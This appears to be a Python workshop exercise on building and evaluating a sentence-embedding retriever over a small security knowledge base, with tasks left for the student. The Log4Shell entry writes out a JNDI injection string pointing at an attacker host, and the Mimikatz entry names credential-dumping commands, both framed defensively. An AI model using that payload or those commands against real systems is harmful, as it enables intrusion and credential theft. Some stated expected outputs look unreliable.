# =============================================================================
# LESSON 4.4 | WORKSHOP | Exercise 2 of 3
# Retrieval: Finding Relevant Chunks
# =============================================================================
# WHAT YOU WILL LEARN
# -------------------
# - How to build a vector index from document chunks
# - How to retrieve the most relevant chunks for any query
# - How to measure whether retrieval is working correctly
#
# RUN THIS FILE
# -------------
#   python module4_genai/lesson4_rag/workshop/exercise2_retrieval.py
#
# pip install sentence-transformers
# No API key required.
# =============================================================================

import re
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity
from sentence_transformers import SentenceTransformer

# Security knowledge base (6 documents)
KNOWLEDGE_BASE = {
    "mimikatz": """
Mimikatz extracts plaintext passwords and NTLM hashes from Windows LSASS memory.
Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden for Golden Ticket attacks.
Detection: monitor LSASS memory access by non-system processes using Sysmon Event ID 10.
Unexpected lsass.exe access from procdump, taskmgr, or unsigned binaries triggers high alerts.
Mitigations: Credential Guard, disable WDigest, Protected Users group, LSA Protection.
Enable audit policies for privilege use; baseline normal dcsync behaviour.
""",
    "log4shell": """
CVE-2021-44228 Log4Shell is a critical RCE vulnerability in Apache Log4j2 versions 2.0-beta9 through 2.14.1.
Attack vector: inject ${jndi:ldap://attacker.com/x} into any logged HTTP field.
Exploitable via User-Agent, X-Forwarded-For, or any parameter that gets logged.
No authentication required; CVSS score 10.0.
Remediation: upgrade to Log4j 2.17.1 or later.
Mitigation: set -Dlog4j2.formatMsgNoLookups=true.
Detection: outbound LDAP from application servers; jndi patterns in web access logs.
""",
    "ransomware": """
Ransomware incident response: Phase 1 (0-30 min) confirm indicators and identify Patient Zero.
Do NOT reboot infected machines — memory forensics may be needed.
Phase 2 (30 min to 2 hr): isolate via VLAN not shutdown, disable compromised accounts, block C2 at perimeter.
Phase 3 (2-24 hr): remove persistence mechanisms, reset all credentials, patch initial access vector.
Phase 4 (1-7 days): restore from clean backups, prioritise critical systems, monitor for re-infection.
Phase 5: root cause analysis, update detection rules, test backup integrity.
""",
    "lateral_movement": """
Lateral movement allows attackers to progressively move through a network after initial compromise.
Detect via SMB authentication anomalies (Event ID 4624 type 3), unusual RDP connections.
PsExec and WMI remote execution are common lateral movement tools; monitor process creation.
Pass-the-Hash attacks reuse NTLM hashes without knowing plaintext passwords.
Baseline normal admin behaviour to distinguish legitimate from malicious activity.
Alert on admin tools appearing on non-admin workstations.
""",
    "phishing": """
Phishing emails impersonate trusted entities to steal credentials or deliver malware.
Identify phishing by checking SPF, DKIM, and DMARC alignment in email headers.
Inspect sender domain age and URL redirect chains for suspicious redirects.
Hash attachments and check against VirusTotal; sandbox unknown executables.
Spear-phishing targets specific individuals using OSINT from LinkedIn and social media.
Business Email Compromise (BEC) uses lookalike domains and urgency to bypass scrutiny.
""",
    "network_segmentation": """
Network segmentation limits lateral movement by dividing infrastructure into isolated zones.
DMZ hosts internet-facing services; separate VLAN for OT and ICS systems; isolated network for domain controllers.
Zero-trust architecture verifies every request and assumes breach at all times.
Microsegmentation uses host-based firewall rules to restrict east-west traffic.
VLAN-based segmentation is fast to implement; SDN-based microsegmentation scales better.
Document all segment boundaries and authorised communication paths in a network diagram.
""",
}

# Evaluation queries — the correct answer is indicated in comments
QUERIES = [
    "how to detect LSASS memory access by attackers?",     # → mimikatz chunks
    "what steps to take when ransomware is detected?",      # → ransomware chunks
    "how to limit attacker movement between network zones?", # → lateral_movement + network_segmentation
]

# =============================================================================
# BACKGROUND
# =============================================================================
# RAG retrieval: two phases
#   Phase 1 — Indexing: encode all chunks → embedding matrix (N, 384)
#   Phase 2 — Query:    encode query → (1, 384)
#                       cosine_similarity → scores (N,)
#                       top_k = argsort(scores)[::-1][:k]

def chunk_overlap(text, chunk_size=60, overlap=15):
    """Split text into overlapping word-based chunks."""
    words = text.split()
    step = chunk_size - overlap
    chunks = []
    for i in range(0, len(words), step):
        chunk = " ".join(words[i:i + chunk_size])
        if len(chunk.split()) >= 10:
            chunks.append(chunk)
    return chunks

# =============================================================================
# TASK 1 — Build the vector index
# =============================================================================
# 1. Chunk every document in KNOWLEDGE_BASE using chunk_overlap().
#    Store: all_chunks = list of (doc_id, chunk_text) tuples
# 2. Load SentenceTransformer("all-MiniLM-L6-v2")
# 3. Encode all chunk_texts: index = model.encode(chunk_texts)
# 4. Print:
#    "Chunked 6 documents → N chunks"
#    "Vector index shape: (N, 384)"
#
# EXPECTED OUTPUT (approximate):
#   Chunked 6 documents → 28 chunks
#   Vector index shape: (28, 384)

# >>> YOUR CODE HERE


# =============================================================================
# TASK 2 — Implement the retrieve function
# =============================================================================
# Write: retrieve(query, top_k=3) -> list of (score, doc_id, chunk_text) tuples
#
#   1. query_emb = model.encode([query])
#   2. sims = cosine_similarity(query_emb, index)[0]
#   3. top_indices = np.argsort(sims)[::-1][:top_k]
#   4. return [(float(sims[i]), all_chunks[i][0], all_chunks[i][1]) for i in top_indices]

# >>> YOUR CODE HERE


# =============================================================================
# TASK 3 — Run 3 queries and print ranked results
# =============================================================================
# For each query in QUERIES:
#   results = retrieve(query, top_k=3)
#   Print:
#     "\nQuery: [query]"
#     "  0.8923 | [doc_id] | [first 80 chars of chunk_text]..."
#
# After each query, manually check: does the relevant document appear at rank 1?
#
# EXPECTED OUTPUT (approximate):
#   Query: how to detect LSASS memory access by attackers?
#     0.8923 | mimikatz | Detection: monitor LSASS memory access by non-system processes...
#     0.7102 | mimikatz | Mitigations: Credential Guard, disable WDigest...
#     0.5834 | lateral_movement | Baseline normal admin behaviour...

# >>> YOUR CODE HERE


# =============================================================================
# TASK 4 — Mean Reciprocal Rank (BONUS)
# =============================================================================
# For each query, the "correct" document id is given:
CORRECT_DOCS = {
    QUERIES[0]: "mimikatz",
    QUERIES[1]: "ransomware",
    QUERIES[2]: "network_segmentation",
}
#
# For each query:
#   1. Retrieve top 5 results
#   2. Find the rank (1-indexed) of the first result matching CORRECT_DOCS[query]
#   3. Reciprocal rank = 1 / rank (or 0 if not found in top 5)
#
# Compute and print Mean Reciprocal Rank = average over all queries.
# Target: MRR >= 0.8

# >>> YOUR CODE HERE


print("\n--- Exercise 2 complete. Move to exercise3_rag_pipeline.py ---")
